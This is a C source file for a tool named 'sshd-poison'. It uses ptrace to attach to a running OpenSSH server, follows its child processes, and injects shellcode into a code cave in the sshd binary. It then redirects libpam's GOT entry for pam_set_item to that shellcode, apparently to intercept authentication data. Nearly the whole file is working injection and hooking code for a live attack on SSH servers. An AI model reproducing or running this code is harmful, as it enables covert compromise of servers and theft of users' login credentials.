#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>

#include "ignotum/src/ignotum.h"

#include "elf-parser.h"
#include "proc-info.h"
#include "ptrace.h"
#include "breakpoint.h"
#include "caves.h"

#include "sc.h"

#define info(x, y...) printf("[%d] " x, pid, ##y);

typedef struct {
    char *sshd;
    char *libpam;
    uint64_t entry_point;
    uint64_t r_offset;
    uint64_t st_value;
    uint64_t cave;
} hook_t;

void poison(hook_t *hook, pid_t pid){
    ignotum_mapinfo_t *pam = NULL, *sshd;
    ignotum_maplist_t map;

    uint64_t pam_set_item, cave;

    size_t i;

    if(ignotum_getmaplist(&map, pid) <= 0){
        info("failed to get maps\n");
        return;
    }

    sshd = map.maps;

    /* get libpam base address */
    for(i=0; i<map.len; i++){
        if(map.maps[i].pathname == NULL)
            continue;

        if(!strcmp(hook->libpam, map.maps[i].pathname)){
            pam = map.maps+i;
            break;
        }
    }

    if(pam == NULL){
        info("failed to get libpam base address\n");
        goto end;
    }

    pam_set_item = pam->start_addr+hook->st_value;
    cave = sshd->start_addr+hook->cave;

    info("pam_set_item@got: 0x%lx\n", pam->start_addr+hook->r_offset);
    info("pam_set_item:     0x%lx\n", pam_set_item);
    info("shellcode addr:   0x%lx\n", cave);

    /* copy the real function address to shellcode */
    memcpy(_bin_sc, &pam_set_item, sizeof(uint64_t));

    /* write shellcode to 'cave' */
    info("%zd bytes written of %d at 0x%lx\n", ignotum_mem_write(pid, _bin_sc, _bin_sc_len, cave),
        _bin_sc_len, cave);

    /* skip the real function address */
    cave += sizeof(uint64_t);

    /* write the shellcode address to got */
    ignotum_mem_write(pid, &cave, sizeof(uint64_t), pam->start_addr+hook->r_offset);

    end:
    free_ignotum_maplist(&map);
}

void infect_loop(hook_t *hook, int pid){
    int status, opt, sig, event;
    uint64_t addr;

    long npid;

    bp_t *bp = NULL;

    printf("[*] attaching the pid %d\n", pid);
    if(ptrace_seize(pid, TRACE_OPTS)){
        perror("[-] ptrace_seize()");
        exit(1);
    }

    printf("[+] process attached, waiting for events ...\n\n");

    while((pid = waitpid(-1, &status, __WALL)) != -1){
        if(status_info(&opt, &sig, &event, status)){
            if(WIFEXITED(status)){
                info("exited with status code: %d\n", WEXITSTATUS(status));
            } else {
                info("terminated with signal: %d\n", WTERMSIG(status));
            }

            continue;
        }

        if(event == PTRACE_EVENT_FORK){
            ptrace(PTRACE_GETEVENTMSG, pid, 0, &npid);
            info("new process attached %d\n", (int)npid);
        }

        else if(event == PTRACE_EVENT_EXEC){
            /* verify if it is a re-exec */
            if(re_exec(hook->sshd, pid)){
                info("re-execve detected\n");

                addr = get_elf_baseaddr(pid)+hook->entry_point;
                info("setting breakpoint at 0x%lx\n", addr);

                /* set breakpoint at start point
                 * wait linker load DSO's */
                if(insert_breakpoint(&bp, pid, addr)){
                    perror("insert_breakpoint()");
                    opt = PTRACE_DETACH;
                }
            } else {
                opt = PTRACE_DETACH;
            }
        } else {
            if(sig == SIGTRAP){
                addr = getip(pid)-1;

                /* check if sigtrap comes from a breakpoint
                 * then infect the process and detach pid */
                if(remove_breakpoint(&bp, pid, addr)){
                    info("delete breakpoint at 0x%lx\n", addr);

                    poison(hook, pid);

                    opt = PTRACE_DETACH;
                    sig = 0;
                }
            }
        }

        info("ptrace(%s, %d, 0, %d) = %ld\n", ptrace_stropt(opt), pid, sig,
            ptrace(opt, pid, 0, sig));
    }

}

/* a beautiful banner */
void banner(void){
    static const char ascii[]=
        "                   .\n"
        "         /^\\     .\n"
        "    /\\   \"V\"\n"
        "   /__\\   I      O  o\n"
        "  //..\\\\  I     .\n"
        "  \\].`[/  I\n"
        "  /l\\/j\\  (]    .  O\n"
        " /. ~~ ,\\/I          .\n"
        " \\\\L__j^\\/I       o\n"
        "  \\/--v}  I     o   .\n"
        "  |    |  I   _________\n"
        "  |    |  I c(`       ')o\n"
        "  |    l  I   \\.     ,/\n"
        "_/j  L l\\_!  _//^---^\\\\_    -Row\n";

    puts(ascii);
}

int main(int argc, char **argv){
    ignotum_mapinfo_t map;
    char *sshd, *libpam;

    elf_t elf, pam;
    hook_t hook;
    rela_t rela;

    banner();
    if(argc != 2){
        printf("sshd-poison [pid]\n");
        return 1;
    }

    pid_t pid = atoi(argv[1]);

    printf("[*] getting information about pid ...\n");

    sshd = get_elf_name(pid);
    if(sshd == NULL){
        printf("[-] failed to get process filename\n");
        return 1;
    }

    printf("[+] sshd filename:    %s\n", sshd);

    if(ignotum_getbasemap(&map, pid, "*libpam.so*", 1)){
        printf("[-] failed to get libpam filename\n");
        return 1;
    }

    libpam = map.pathname;
    if(libpam == NULL){
        return 1;
    }
    printf("[+] libpam filename:  %s\n", libpam);

    elf_parser(&elf, sshd);
    printf("[+] entry-point:      sshd+0x%lx\n", elf.header->e_entry);

    elf_parser(&pam, libpam);

    if(getrelabyname(&pam, &rela, ".rela.dyn", "pam_set_item")){
        if(getrelabyname(&pam, &rela, ".rela.plt", "pam_set_item")){
            printf("[-] pam_set_item symbol not found !!!\n");
            return 1;
        }
    }

    printf("[+] pam_set_item@got: libpam+0x%lx\n", rela.rel->r_offset);
    printf("[+] pam_set_item:     libpam+0x%lx\n", rela.sym->st_value);

    hook.cave = xcave(&elf, _bin_sc_len);
    if(!hook.cave){
        printf("[-] can't write shellcode ...\n");
        return 1;
    }

    printf("[+] shellcode addr:   sshd+0x%lx\n", hook.cave);

    hook.sshd = sshd;
    hook.entry_point = elf.header->e_entry;
    hook.libpam = libpam;
    hook.st_value = rela.sym->st_value;
    hook.r_offset = rela.rel->r_offset;

    free_elf(&elf);
    free_elf(&pam);

    infect_loop(&hook, pid);

    return 0;
}
